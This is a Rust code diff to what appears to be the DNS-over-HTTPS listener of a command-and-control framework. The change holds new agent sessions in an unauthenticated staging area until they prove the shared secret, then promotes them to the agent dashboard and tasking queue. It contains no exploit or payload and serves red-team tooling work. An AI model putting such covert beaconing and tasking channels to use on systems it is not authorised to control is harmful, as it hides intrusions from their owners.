@@ -44,7 +44,13 @@ struct DohRuntime {
     beacon_sentinel: Ipv4Addr,
     idle_ip: Ipv4Addr,
     crypto: Arc<CryptoSession>,
+    /// Fully-authenticated sessions visible on the dashboard.
     sessions: Arc<DashMap<String, Arc<Mutex<DohSession>>>>,
+    /// Unauthenticated staging area. Sessions live here until the sender
+    /// proves they hold the shared secret by producing a valid ciphertext
+    /// that decrypts + deserializes. Only then are they promoted to
+    /// `sessions` and appear in the agent dashboard.
+    staging: Arc<DashMap<String, Arc<Mutex<DohSession>>>>,
     rate_limit_qps: u32,
     rate_buckets: Arc<DashMap<IpAddr, IpRateBucket>>,
 }
@@ -93,35 +99,38 @@ impl DohRuntime {
             idle_ip,
             crypto: Arc::new(CryptoSession::from_shared_secret(agent_secret.as_bytes())),
             sessions: Arc::new(DashMap::new()),
+            staging: Arc::new(DashMap::new()),
             rate_limit_qps,
             rate_buckets: Arc::new(DashMap::new()),
         })
     }
 
-    fn get_or_create_session(&self, session_id: &str) -> Arc<Mutex<DohSession>> {
-        match self.sessions.entry(session_id.to_string()) {
+    /// Return the authenticated session for `session_id`, if it exists.
+    /// Returns `None` if the session has not yet been authenticated.
+    fn get_authenticated_session(&self, session_id: &str) -> Option<Arc<Mutex<DohSession>>> {
+        self.sessions.get(session_id).map(|r| r.value().clone())
+    }
+
+    /// Return the staging session for `session_id`, creating a new
+    /// unauthenticated one if needed.  Staging sessions do **not** appear in
+    /// the agent dashboard; they merely buffer encrypted fragments until the
+    /// sender proves possession of the shared secret.
+    fn get_or_create_staging_session(&self, session_id: &str) -> Arc<Mutex<DohSession>> {
+        match self.staging.entry(session_id.to_string()) {
             Entry::Occupied(o) => o.get().clone(),
             Entry::Vacant(v) => {
-                let connection_id = format!("doh-{session_id}");
-                let (tx, rx) = mpsc::channel::<Message>(64);
-
-                self.app.registry.insert(
-                    connection_id.clone(),
-                    AgentEntry {
-                        connection_id: connection_id.clone(),
-                        agent_id: format!("doh-{session_id}"),
-                        hostname: "doh".to_string(),
-                        last_seen: now_secs(),
-                        tx,
-                        peer: format!("doh/{session_id}"),
-                    },
-                );
-
                 let session = Arc::new(Mutex::new(DohSession {
-                    connection_id,
+                    connection_id: format!("doh-{session_id}"),
                     fragments: BTreeMap::new(),
                     next_seq: None,
-                    outbound_rx: rx,
+                    outbound_rx: {
+                        // Create a dummy channel — it will be replaced on
+                        // promotion.  The sender is dropped immediately so no
+                        // messages can queue.
+                        let (tx, rx) = mpsc::channel::<Message>(64);
+                        drop(tx);
+                        rx
+                    },
                     outbound_queue: VecDeque::new(),
                     last_activity: Instant::now(),
                     authenticated: false,
@@ -130,6 +139,42 @@ impl DohRuntime {
                 session
             }
         }
+    }
+
+    /// Promote a staging session to a fully-authenticated session.
+    /// Creates the `AgentEntry` in the registry, registers in the
+    /// `sessions` map, and removes from staging.  Returns the promoted
+    /// session handle.
+    fn promote_session(&self, session_id: &str, staging_sess: Arc<Mutex<DohSession>>) {
+        let connection_id = format!("doh-{session_id}");
+        let (tx, rx) = mpsc::channel::<Message>(64);
+
+        // Register in the agent dashboard.
+        self.app.registry.insert(
+            connection_id.clone(),
+            AgentEntry {
+                connection_id: connection_id.clone(),
+                agent_id: format!("doh-{session_id}"),
+                hostname: "doh".to_string(),
+                last_seen: now_secs(),
+                tx,
+                peer: format!("doh/{session_id}"),
+            },
+        );
+
+        // Replace the dummy outbound_rx with the real channel.
+        {
+            let mut guard = match staging_sess.lock() {
+                Ok(g) => g,
+                Err(poisoned) => poisoned.into_inner(),
+            };
+            guard.outbound_rx = rx;
+            guard.authenticated = true;
+        }
+
+        // Move from staging to authenticated sessions.
+        self.staging.remove(session_id);
+        self.sessions.insert(session_id.to_string(), staging_sess);
     }
 
     fn allow_query_from_ip(&self, ip: IpAddr) -> bool {
@@ -259,28 +304,26 @@ impl DohRuntime {
     }
 
     fn session_has_pending_tasking(&self, session_id: &str) -> bool {
-        let session = self.get_or_create_session(session_id);
+        let Some(session) = self.get_authenticated_session(session_id) else {
+            return false;
+        };
         let mut guard = match session.lock() {
             Ok(g) => g,
             Err(poisoned) => poisoned.into_inner(),
         };
-        if !guard.authenticated {
-            return false;
-        }
         Self::drain_outbound_queue(&mut guard);
         !guard.outbound_queue.is_empty()
     }
 
     fn pop_tasking_answers(&self, session_id: &str) -> Vec<Answer> {
-        let session = self.get_or_create_session(session_id);
+        let Some(session) = self.get_authenticated_session(session_id) else {
+            return Vec::new();
+        };
         let maybe_msg = {
             let mut guard = match session.lock() {
                 Ok(g) => g,
                 Err(poisoned) => poisoned.into_inner(),
             };
-            if !guard.authenticated {
-                return Vec::new();
-            }
             Self::drain_outbound_queue(&mut guard);
             guard.outbound_queue.pop_front()
         };
@@ -314,7 +357,12 @@ impl DohRuntime {
             return;
         }
 
-        let session = self.get_or_create_session(session_id);
+        // Check if already authenticated — if so, use the authenticated session.
+        // Otherwise, use the staging area.
+        let session = self
+            .get_authenticated_session(session_id)
+            .unwrap_or_else(|| self.get_or_create_staging_session(session_id));
+
         let msgs = {
             let mut guard = match session.lock() {
                 Ok(g) => g,
@@ -325,15 +373,27 @@ impl DohRuntime {
             if guard.next_seq.is_none() {
                 guard.next_seq = Some(seq);
             }
-            let msgs = try_reassemble_messages(&mut guard, &self.crypto);
-            if !msgs.is_empty() {
-                // A successfully decrypted + deserialized message proves the
-                // sender holds the shared DoH secret. Only then is tasking
-                // released via beacon/task polling.
+            try_reassemble_messages(&mut guard, &self.crypto)
+        };
+
+        if msgs.is_empty() {
+            return;
+        }
+
+        // A successfully decrypted + deserialized message proves the sender
+        // holds the shared DoH secret.  Promote from staging if needed.
+        let is_newly_authenticated = !self.sessions.contains_key(session_id);
+        if is_newly_authenticated {
+            // Mark as authenticated inside the session.
+            {
+                let mut guard = match session.lock() {
+                    Ok(g) => g,
+                    Err(poisoned) => poisoned.into_inner(),
+                };
                 guard.authenticated = true;
             }
-            msgs
-        };
+            self.promote_session(session_id, session.clone());
+        }
 
         for msg in msgs {
             self.handle_agent_message(session_id, msg);
@@ -402,7 +462,9 @@ impl DohRuntime {
     }
 
     fn enqueue_outbound(&self, session_id: &str, msg: Message) {
-        let session = self.get_or_create_session(session_id);
+        let Some(session) = self.get_authenticated_session(session_id) else {
+            return;
+        };
         let mut guard = match session.lock() {
             Ok(g) => g,
             Err(poisoned) => poisoned.into_inner(),
@@ -439,7 +501,31 @@ impl DohRuntime {
             self.app.registry.remove(connection_id);
         }
 
-        stale.len()
+        // Also sweep stale unauthenticated staging sessions.
+        let staging_stale: Vec<String> = self
+            .staging
+            .iter()
+            .filter_map(|entry| {
+                let session_id = entry.key().clone();
+                let session = entry.value().clone();
+                let guard = match session.lock() {
+                    Ok(g) => g,
+                    Err(poisoned) => poisoned.into_inner(),
+                };
+                if now.saturating_duration_since(guard.last_activity) > stale_after {
+                    Some(session_id)
+                } else {
+                    None
+                }
+            })
+            .collect();
+
+        let staging_count = staging_stale.len();
+        for session_id in &staging_stale {
+            self.staging.remove(session_id);
+        }
+
+        stale.len() + staging_count
     }
 }
 
